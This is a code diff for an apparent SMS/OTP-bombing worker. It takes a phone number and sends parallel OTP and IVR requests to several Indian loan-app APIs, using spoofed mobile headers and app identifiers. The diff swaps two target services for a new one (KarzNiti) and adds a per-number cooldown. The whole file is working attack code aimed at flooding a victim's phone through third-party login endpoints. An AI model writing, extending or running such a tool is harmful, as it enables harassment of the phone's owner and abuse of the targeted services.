@@ -8,6 +8,8 @@ const fg = new FlareGun({
     accountId: "e4090ee1d3e9226b0fc137d95ad99a0d"
 });
 
+const COOLDOWN_SECONDS = 30;
+
 // ========================
 // Helper: random string
 // ========================
@@ -21,71 +23,7 @@ function randomString(len = 8) {
 }
 
 // ========================
-// 1) CashBridge
-// ========================
-async function sendCashBridge(phone) {
-    const clean = phone.replace(/\D/g, '');
-    if (clean.length !== 10) throw new Error('10 digits required');
-
-    return await fg.fetch('https://loan.getcashbridge.com/sdkl/vitamin/bottom/react', {
-        method: 'POST',
-        headers: {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Content-Type': 'application/json',
-            'sec-ch-ua-platform': 'Android',
-            'x-version': '1.0.0',
-            'x-package-name': 'com.cash.bridge.loan.gg',
-            'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
-            'sec-ch-ua-mobile': '?1',
-            'versionnumber': '1.0.0',
-            'origin': 'https://loan.getcashbridge.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://loan.getcashbridge.com/login?utm_source=chatgpt.com',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5',
-            'priority': 'u=1, i',
-            'Cookie': '_gcl_au=1.1.1354668386.1789809534'
-        },
-        body: JSON.stringify({
-            govern: clean,
-            new: 'register',
-            pattern: true,
-            disaster: 'cd414c2453dd3ec74e7c879a12e438e0'
-        })
-    });
-}
-
-// ========================
-// 2) PaisaCash
-// ========================
-async function sendPaisaCash(phone) {
-    const clean = phone.replace(/\D/g, '');
-    if (clean.length !== 10) throw new Error('10 digits required');
-
-    return await fg.fetch('https://san.paisacashfin.com/pakh/fifth/protect/diet/stumble', {
-        method: 'POST',
-        headers: {
-            'host': 'san.paisacashfin.com',
-            'infection': '',
-            'nearly': '1.0.0',
-            'burden': 'com.paisacash.loan',
-            'content-type': 'application/json; charset=utf-8',
-            'accept-encoding': 'gzip',
-            'user-agent': 'okhttp/5.1.0'
-        },
-        body: JSON.stringify({
-            perfectly: 'd03ffaa6ce77e9b6a0c7b26dcbf16567',
-            through: clean,
-            sit: true
-        })
-    });
-}
-
-// ========================
-// 3) MatePaisa
+// 1) MatePaisa
 // ========================
 async function sendMatePaisa(phone) {
     const clean = phone.replace(/\D/g, '');
@@ -113,7 +51,7 @@ async function sendMatePaisa(phone) {
 }
 
 // ========================
-// 4) Velocity (2-step)
+// 2) Velocity (2-step)
 // ========================
 async function sendVelocity(phone) {
     const clean = phone.replace(/\D/g, '');
@@ -182,7 +120,7 @@ async function sendVelocity(phone) {
 }
 
 // ========================
-// 5) Beato (IVR OTP)
+// 3) Beato (IVR OTP)
 // ========================
 async function sendBeato(phone) {
     const clean = phone.replace(/\D/g, '');
@@ -212,6 +150,34 @@ async function sendBeato(phone) {
 }
 
 // ========================
+// 4) KarzNiti
+// ========================
+async function sendKarzNiti(phone) {
+    const clean = phone.replace(/\D/g, '');
+    if (clean.length !== 10) throw new Error('10 digits required');
+
+    return await fg.fetch('https://karznitiinterface.karyojana.com/oecm/hcihdx', {
+        method: 'POST',
+        headers: {
+            'qzkehgfpacxckrsvdqphd': '8021d71b2a927dd8',
+            'user-agent': 'Dart/3.9 (dart:io)',
+            'accept-encoding': 'gzip',
+            'content-type': 'application/json',
+            'bhmigcvcfeksevo': 'app.loancompare.emicalc.creditbetter',
+            'qboyqvegdbmdtpy': 'KarzNiti',
+            'fchnitebabnkpto': '143a189f7ca5cb727d1e013a51cb741a',
+            'wvzdfrtjjsvekenhsn': '',
+            'charset': 'utf-8',
+            'host': 'karznitiinterface.karyojana.com',
+            'yvtyjgfsjbe': '1',
+            'pothyefcbktwecri': '9d0f5264-64a8-44f9-b5ca-bb3b0771c355',
+            'fhvkzjrqejxyjima': '1'
+        },
+        body: JSON.stringify({ uqooSlxcCzze: clean })
+    });
+}
+
+// ========================
 // Safe wrapper
 // ========================
 async function safe(name, fn, phone) {
@@ -233,10 +199,36 @@ async function safe(name, fn, phone) {
 }
 
 // ========================
+// Cooldown helpers (KV)
+// ========================
+async function isOnCooldown(env, phone) {
+    if (!env || !env.COOLDOWN_KV) return { cooldown: false };
+    const key = `cd:${phone}`;
+    const val = await env.COOLDOWN_KV.get(key);
+    if (!val) return { cooldown: false };
+
+    const expiresAt = parseInt(val, 10);
+    const now = Date.now();
+    if (now < expiresAt) {
+        const remaining = Math.ceil((expiresAt - now) / 1000);
+        return { cooldown: true, remaining };
+    }
+    return { cooldown: false };
+}
+
+async function setCooldown(env, phone) {
+    if (!env || !env.COOLDOWN_KV) return;
+    const key = `cd:${phone}`;
+    const expiresAt = Date.now() + COOLDOWN_SECONDS * 1000;
+    // KV expirationTtl minimum is 60s, so we store absolute timestamp and check manually
+    await env.COOLDOWN_KV.put(key, String(expiresAt), { expirationTtl: 60 });
+}
+
+// ========================
 // Worker Entry
 // ========================
 export default {
-    async fetch(request) {
+    async fetch(request, env) {
         const url = new URL(request.url);
         const mobile = url.searchParams.get('mobile');
 
@@ -253,19 +245,37 @@ export default {
             });
         }
 
-        // 🔥 5 APIs parallel
+        // ⏳ Cooldown check
+        const cd = await isOnCooldown(env, clean);
+        if (cd.cooldown) {
+            return new Response(JSON.stringify({
+                mobile: clean,
+                cooldown: true,
+                remaining: cd.remaining,
+                message: `Please wait ${cd.remaining}s before retrying this number`
+            }), {
+                status: 429,
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }
+
+        // 🔥 4 APIs parallel
         const results = await Promise.all([
-            safe('cashbridge', sendCashBridge, clean),
-            safe('paisacash', sendPaisaCash, clean),
             safe('matepaisa', sendMatePaisa, clean),
             safe('velocity', sendVelocity, clean),
-            safe('beato', sendBeato, clean)
+            safe('beato', sendBeato, clean),
+            safe('karzniti', sendKarzNiti, clean)
         ]);
 
         const successCount = results.filter(r => r.success).length;
 
+        // ✅ Set cooldown after sending
+        await setCooldown(env, clean);
+
         return new Response(JSON.stringify({
             mobile: clean,
+            cooldown: true,
+            cooldown_seconds: COOLDOWN_SECONDS,
             total: results.length,
             success: successCount,
             failed: results.length - successCount,
